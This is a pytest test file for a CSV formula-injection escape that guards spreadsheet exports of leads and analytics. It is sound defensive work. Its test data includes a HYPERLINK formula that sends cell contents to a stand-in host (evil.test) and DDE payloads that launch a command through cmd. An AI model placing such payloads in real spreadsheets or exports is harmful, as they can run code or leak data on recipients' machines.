"""The shared CSV-injection escape.

Unit tests only, and deliberately DB-free: this escape is the last thing
standing between a visitor-typed string and code execution on a customer's
laptop, so it must be exercised on every run — not only on runs that happen to
have Postgres reachable. The route-level tests that prove each export actually
*calls* it live next to those routes (``test_reporting_rollup.py`` for
``/analytics/by-bot.csv``, ``test_lead_routes.py`` for ``/leads/export``).
"""

from __future__ import annotations

import pytest

from app.core.csv_safety import CSV_FORMULA_PREFIXES, csv_safe, csv_safe_row


@pytest.mark.parametrize(
    ("payload", "why"),
    [
        ('=HYPERLINK("https://evil.test/?"&A1,"Click")', "formula"),
        ('+cmd|" /C calc"!A0', "signed expression / DDE"),
        ('-2+3+cmd|" /C calc"!A0', "signed expression / DDE"),
        ("@SUM(1+1)*cmd|' /C calc'!A0", "legacy Lotus-style formula"),
        # Excel strips a leading TAB/CR before deciding whether the cell is a
        # formula, so a check that only looks for "=" misses these two.
        ("\t=1+1", "TAB-prefixed formula"),
        ("\r=1+1", "CR-prefixed formula"),
    ],
)
def test_csv_safe_neutralises_every_formula_trigger(payload: str, why: str) -> None:
    escaped = csv_safe(payload)
    # The defence: a leading single quote, so the spreadsheet reads the rest of
    # the cell as literal text rather than as an expression.
    assert escaped == f"'{payload}", why
    assert not escaped.startswith(CSV_FORMULA_PREFIXES), why
    # Nothing is silently dropped — the value stays fully recoverable.
    assert escaped[1:] == payload, why


def test_csv_safe_covers_the_whole_owasp_trigger_list() -> None:
    """Every character in the constant is actually acted on.

    Guards against someone widening ``CSV_FORMULA_PREFIXES`` for documentation
    value while the escape silently keeps using a narrower rule.
    """
    for prefix in CSV_FORMULA_PREFIXES:
        assert csv_safe(f"{prefix}payload") == f"'{prefix}payload", prefix


@pytest.mark.parametrize(
    "value",
    ["Acme Support", 'Acme, Inc. "Main"', "", "Café ☕", "2026 Bot", "priya@infosys.com"],
)
def test_csv_safe_leaves_an_ordinary_value_alone(value: str) -> None:
    """The escape is targeted — commas and quotes are the writer's job, not its.

    ``priya@infosys.com`` is the case worth naming: the trigger is a *leading*
    ``@``, so an ordinary email address must survive untouched or every lead
    export grows a stray quote.
    """
    assert csv_safe(value) == value


def test_csv_safe_tolerates_a_missing_value() -> None:
    """Nullable columns are everywhere in the exports; none may crash one."""
    assert csv_safe(None) == ""


def test_csv_safe_escapes_only_the_leading_position() -> None:
    """A trigger further into the string is inert — Excel only looks at cell start."""
    assert csv_safe("Budget is =1+1 per seat") == "Budget is =1+1 per seat"


def test_csv_safe_does_not_double_escape_an_already_quoted_value() -> None:
    """Applying the escape twice must not stack quotes.

    Not a hypothetical: the value a customer sees in the dashboard is the raw
    one, so a re-export of a previously-escaped string would otherwise drift.
    """
    once = csv_safe("=1+1")
    assert csv_safe(once) == once


# ── The row funnel ───────────────────────────────────────────────────────────
#
# This is where the "a column added later is safe by default" property actually
# lives. An export test can only assert about the columns it knows to fill in,
# so it can never prove that claim; these can, because they hand the funnel
# strings it was never told about.


def test_csv_safe_row_escapes_every_string_it_is_given() -> None:
    """No cell is exempt — including ones no caller anticipated.

    The point of the funnel: it does not know or care which column is which, so
    a column appended to an export cannot miss the escape by omission.
    """
    row = csv_safe_row(["=1+1", "ordinary", "@SUM(1)", "", "\t=1+1"])

    assert row == ["'=1+1", "ordinary", "'@SUM(1)", "", "'\t=1+1"]
    for cell in row:
        assert not str(cell).startswith(CSV_FORMULA_PREFIXES)


def test_csv_safe_row_leaves_numbers_numeric() -> None:
    """Ints and floats must survive as numbers, not become text.

    Escaping them would prefix a quote and turn the column into strings in the
    recipient's sheet, breaking every SUM and sort built on the export — which
    is why this cannot be a plain ``[csv_safe(v) for v in row]``.
    """
    row = csv_safe_row(["Acme", 0, 42, 3.5, None, True])

    assert row == ["Acme", 0, 42, 3.5, None, True]
    assert [type(cell) for cell in row[1:]] == [int, int, float, type(None), bool]


def test_csv_safe_row_preserves_column_order_and_count() -> None:
    """A row funnel that reordered or dropped a cell would corrupt every export."""
    values = ["=a", 1, "b", None, "@c"]
    row = csv_safe_row(values)

    assert len(row) == len(values)
    assert [str(cell).lstrip("'") for cell in row] == ["=a", "1", "b", "None", "@c"]


def test_csv_safe_row_accepts_a_generator() -> None:
    """Callers build rows lazily; consuming an iterable once must still work."""
    assert csv_safe_row(f"={n}" for n in range(3)) == ["'=0", "'=1", "'=2"]
